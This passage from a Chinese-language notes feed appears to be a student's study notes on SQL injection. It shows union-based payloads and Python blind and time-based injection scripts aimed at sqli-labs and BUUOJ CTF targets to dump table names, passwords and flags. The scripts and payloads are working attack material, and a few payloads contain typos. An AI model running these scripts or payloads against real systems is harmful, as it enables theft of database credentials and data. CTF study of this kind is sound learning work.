+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>group_concat不能同时配合limit使用&lt;/p></description></item><item><title>整型注入</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>整形注入&lt;/p>
+&lt;p>测试&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查询字段数,小于等于不报错，大于报错&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">order&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>确定字段数后，数据库名&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1111&lt;/span> &lt;span style="color:#66d9ef">union&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#66d9ef">database&lt;/span>()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>表名&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1111&lt;/span> &lt;span style="color:#66d9ef">union&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,group_concat(&lt;span style="color:#66d9ef">table_name&lt;/span>) form information_schema.tables &lt;span style="color:#66d9ef">where&lt;/span> table_schema&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">database&lt;/span>()&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>字段&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1111&lt;/span> &lt;span style="color:#66d9ef">union&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,group_concat(&lt;span style="color:#66d9ef">column_name&lt;/span>) form information_schema.columns &lt;span style="color:#66d9ef">where&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> table_schema&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">database&lt;/span>() &lt;span style="color:#66d9ef">table_name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;users&amp;#39;&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查值&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1111&lt;/span> &lt;span style="color:#66d9ef">union&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,username form users&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查其他数据库&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1111&lt;/span> &lt;span style="color:#66d9ef">union&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,group_concat(&lt;span style="color:#66d9ef">schema_name&lt;/span>) form information_schema.schemata&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>时间注入</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</guid><description>&lt;p>时间盲注&lt;/p>
+&lt;p>不会抛出错误语句，怎们都是返回一样的&lt;/p>
+&lt;p>jb不知道什么问题python发包时用parse不行，要直接拼在url上&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests&lt;span style="color:#f92672">,&lt;/span>time
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">10&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> low &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> high &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid &lt;span style="color:#f92672">=&lt;/span> (low &lt;span style="color:#f92672">+&lt;/span> high) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> low &lt;span style="color:#f92672">&amp;lt;&lt;/span> high:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 爆出数据库名&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://127.0.0.1/Less-9/?id=1&amp;#39; and if(ascii(substr((select database()),&lt;/span>&lt;span style="color:#e6db74">{0}&lt;/span>&lt;span style="color:#e6db74">,1))&amp;gt;&lt;/span>&lt;span style="color:#e6db74">{1}&lt;/span>&lt;span style="color:#e6db74">,sleep(1),0)--+&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(i,mid)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> start_time &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time() &lt;span style="color:#75715e"># 注入前的系统时间&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(url)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> end_time &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time() &lt;span style="color:#75715e"># 注入后的时间&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> end_time &lt;span style="color:#f92672">-&lt;/span> start_time &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> low &lt;span style="color:#f92672">=&lt;/span> mid &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> high &lt;span style="color:#f92672">=&lt;/span> mid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid &lt;span style="color:#f92672">=&lt;/span> (low &lt;span style="color:#f92672">+&lt;/span> high) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> mid &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">or&lt;/span> mid &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> chr(mid) 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print (name)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>盲注</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E7%9B%B2%E6%B3%A8/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E7%9B%B2%E6%B3%A8/</guid><description>&lt;p>盲注就是回显只有对或者错的情况（如0，1）&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39; or &amp;#39;&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;=&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39; group by passwd with rollup having passwd is NULL — –
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>测试极客大挑战&lt;strong>finalsql&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> time
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://e7adeb0b-7190-4ea3-bd06-49e63e17e775.node4.buuoj.cn:81/backend/content_detail.php&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>parse&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#e6db74">&amp;#39;id&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getDatabase&lt;/span>(): &lt;span style="color:#75715e">#获取数据库名&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> host
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ans&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">1000&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> low &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> high &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid &lt;span style="color:#f92672">=&lt;/span> (low&lt;span style="color:#f92672">+&lt;/span>high)&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> low &lt;span style="color:#f92672">&amp;lt;&lt;/span> high:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.1&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(database())),%d,1))&amp;lt;%d)^1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&amp;lt;%d)^1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;#39;users&amp;#39;)),%d,1))&amp;lt;%d)^1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(password))from(users)),%d,1))&amp;lt;%d)^1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&amp;lt;%d)^1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&amp;#39;ctftraining&amp;#39;)),%d,1))&amp;lt;%d)^1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&amp;#39;ctftraining&amp;#39;(and)schema_name=&amp;#39;ctftraining&amp;#39;)),%d,1))&amp;lt;%d)^1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 1^(ascii(substr((select(group_concat(Flag))from(ctftraining.Flag)),%d,1))&amp;lt;%d)^1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parse[&lt;span style="color:#e6db74">&amp;#39;id&amp;#39;&lt;/span>]&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1^(ascii(substr((select(group_concat(Flag))from(ctftraining.Flag)),&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">,1))&amp;lt;&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">)^1&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (i,mid)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(host,params&lt;span style="color:#f92672">=&lt;/span>parse)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> res&lt;span style="color:#f92672">.&lt;/span>status_code&lt;span style="color:#f92672">!=&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;!200&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print(res.text)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;title&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> res&lt;span style="color:#f92672">.&lt;/span>text:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> high &lt;span style="color:#f92672">=&lt;/span> mid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> low &lt;span style="color:#f92672">=&lt;/span> mid&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid&lt;span style="color:#f92672">=&lt;/span>(low&lt;span style="color:#f92672">+&lt;/span>high)&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> mid &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">or&lt;/span> mid &lt;span style="color:#f92672">&amp;gt;=&lt;/span>&lt;span style="color:#ae81ff">127&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(mid&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">33&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> g&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(g&lt;span style="color:#f92672">&amp;gt;=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> g&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ans &lt;span style="color:#f92672">+=&lt;/span> chr(mid&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;database is -&amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>ans)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>getDatabase()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># news&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># admin,contents&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> time
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://2adc3617-76d6-4705-84e4-1c0e3f21baa2.node4.buuoj.cn:81/search.php&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#f92672">=&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;id&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">1000&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">33&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">130&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid &lt;span style="color:#f92672">=&lt;/span> (l&lt;span style="color:#f92672">+&lt;/span>r)&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(l&lt;span style="color:#f92672">&amp;lt;&lt;/span>r):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload[&lt;span style="color:#e6db74">&amp;#34;id&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;0^&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(ascii(substr((select(group_concat(password))from(F1naI1y)),&lt;/span>&lt;span style="color:#e6db74">{0}&lt;/span>&lt;span style="color:#e6db74">,1))&amp;gt;&lt;/span>&lt;span style="color:#e6db74">{1}&lt;/span>&lt;span style="color:#e6db74">)&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(i,mid)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> html &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>post(url,params&lt;span style="color:#f92672">=&lt;/span>payload)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(payload)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(html&lt;span style="color:#f92672">.&lt;/span>code&lt;span style="color:#f92672">!=&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.2&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;错误,以延迟0.2秒&amp;#39;&lt;/span>,html&lt;span style="color:#f92672">.&lt;/span>code)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 正常的回显内容&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;others&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> html&lt;span style="color:#f92672">.&lt;/span>text:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l &lt;span style="color:#f92672">=&lt;/span> mid&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> mid
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid &lt;span style="color:#f92672">=&lt;/span> (l&lt;span style="color:#f92672">+&lt;/span>r)&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(chr(mid)&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> result &lt;span style="color:#f92672">+&lt;/span> chr(mid)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#出现连续的感叹号,就停&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(mid&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">33&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> g&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(g&lt;span style="color:#f92672">&amp;gt;=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> g&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(result)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;tables: &amp;#34;&lt;/span> ,result)
